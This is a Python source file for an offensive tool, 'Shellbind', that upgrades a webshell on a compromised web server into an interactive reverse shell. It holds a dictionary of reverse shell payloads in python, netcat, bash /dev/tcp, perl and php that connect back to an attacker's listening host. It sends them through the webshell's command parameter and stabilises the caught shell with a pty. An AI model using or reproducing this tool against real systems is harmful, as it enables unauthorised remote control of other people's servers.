#!/usr/bin/env python

import requests
import argparse
import sys
import readline
import nclib
import tty
import time
import os
import multiprocessing

# Parse Command Line Arguments
parser = argparse.ArgumentParser(description="Shellbind is a programm that helps to upgrade a simple GET/POST webshell into a semi- or fully-interactive (reverse) shell.", epilog="Examples:\n-Semi interactive shell (no cd, su, etc.)\n\tshellbind.py -X POST -p cmd -u http://vuln.example/shell.php\n-Fully interactive shell with verbose output\n\tshellbind.py -p cmd -u http://vuln.example/shell.py -v -r auto:10.10.13.37:8080", formatter_class=argparse.RawTextHelpFormatter)

parser.add_argument("-p", "--parameter", metavar="PARAMETER NAME", dest="para_name", help="The parameter the is used to run shell commands", required=True, nargs=1)
parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used (Default: GET)", default="GET", nargs=1)
parser.add_argument("-u", "--host", dest="host", metavar="HOST", help="The host that is attacked.\nExample: http://www.victim.com/vuln.php", required=True, nargs=1)
parser.add_argument("-v", "--verbose", dest="debug", help="Verbose Output", action='store_true', default=False)
parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a fully-interactive reverse shell.\nAvailable methods are:\n  auto - Try until a reverse shell binds\n  php - php reverseshell\n  py - python3 reverse shell with sockets\n  py2 - python2 reverse shell with sockets\n  nc1 - netcat reverse shell with -e flag\n  nc2 - netcat reverse shell with -c flag\n  bash - sh -i reverse shell\n  perl - perl reverse shell\nLHOST should be the ip that the victim can connect to\nThe port can be any unused port", metavar="METHOD:LHOST:PORT", nargs=1)
args = parser.parse_args()

# Initilized listener and start trying reverse shell payloads
def init_upgraded_shell():
    args.method = args.method.upper()
    if args.method not in ["GET", "POST"]:
        print(f"[!] Method {args.method} not recognized")
        sys.exit()
    try:
        payload_method, ip, port = args.reverse[0].split(":")
        port = int(port)
        # Payloads from revshells.com
        payloads = {
                "py": f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""",
                "py2": f"""python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""",
                "nc1": f"""nc {ip} {port} -e sh""",
                "nc2": f"""nc -c sh {ip} {port}""",
                "bash": f"""sh -i >& /dev/tcp/{ip}/{port} 0>&1""",
                "perl": f"""perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");}};'""",
                "php": f"""php -r '$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");'"""

        }
        if payload_method not in payloads.keys() and payload_method != 'auto':
            print("[!] Method not found")
            sys.exit()
        p = multiprocessing.Process(target=back_call, args=[payload_method, ip, port, payloads])
        p.start()
        interactive_shell(ip, port, p)
    except (ValueError):
        print("[!] Could not parse METHOD:IP:PORT")


# Tries to call back to listener with given payloads or tries everything if set to auto
def back_call(payload_method, ip, port, payloads):
    time.sleep(1)
    timeout = 1
    if payload_method == 'auto':
        for payload in payloads.values():
            try:
                if args.debug:
                    print(f"[!] Trying: {payload}") 
                if args.method == "GET":
                    params = {args.para_name[0]: payload}
                    requests.get(args.host[0], params=params, timeout=timeout)
                elif args.method == "POST":
                    params = {args.para_name[0]: payload}
                    requests.post(args.host[0], data=params, timeout=timeout)
                time.sleep(1)
            except:
                pass
    else:
        payload = payloads[payload_method]
        try:
            if args.debug:
                print(f"[!] Trying: {payload}") 
            if args.method == "GET":
                params = {args.para_name[0]: payload}
                requests.get(args.host[0], params=params, timeout=timeout)
            elif args.method == "POST":
                params = {args.para_name[0]: payload}
                requests.post(args.host[0], data=params, timeout=timeout)
            time.sleep(1)
        except:
            pass
        print(f"[!] Method {payload_method} was not successfull")


# Listens on given port and catches reverse shell. Then proceeds to upgrade it.
def interactive_shell(ip, port, child_process):
    try:
        print("[!] Starting listener")
        nc = nclib.Netcat(listen=(ip, port))
    except KeyboardInterrupt:
        child_process.terminate()
        sys.exit()
    child_process.terminate()
    if args.debug:
        print("[!] Backcall Process Terminates. Received Shell")
    tty.setraw(0)
    columns, rows = os.get_terminal_size()
    nc.send("\n")
    nc.send(f"stty rows {rows} cols {columns}\n")
    nc.send('''python3 -c "import pty;pty.spawn('/bin/bash')"\n''')
    time.sleep(1)
    nc.send("reset\n")
    nc.interactive()
    

def web_shell():
    args.method = args.method.upper()
    if args.method not in ["GET", "POST"]:
        print(f"[!] Method {args.method} not recognized")
        sys.exit()
    if args.debug:
        print("[!] Shellbind is ready. You can run commands now")
    while True:
        try:
            command = input("$ ")
            if args.method == "GET":
                params = {args.para_name[0]: command}
                res = requests.get(args.host[0], params=params)
            else:
                params = {args.para_name[0]: command}
                res = requests.post(args.host[0], data=params)
            print(res.text)
        except requests.ConnectionError:
            host = args.host[0].replace("\n", "")
            print(f"[!] Connection to {host} not possible")
            sys.exit()
        except KeyboardInterrupt:
            if args.debug:
                print("[!] Exiting Connection to webshell")
            sys.exit()



if __name__ == '__main__':
    
    if args.reverse is not None :
        init_upgraded_shell()
    else:
        web_shell()




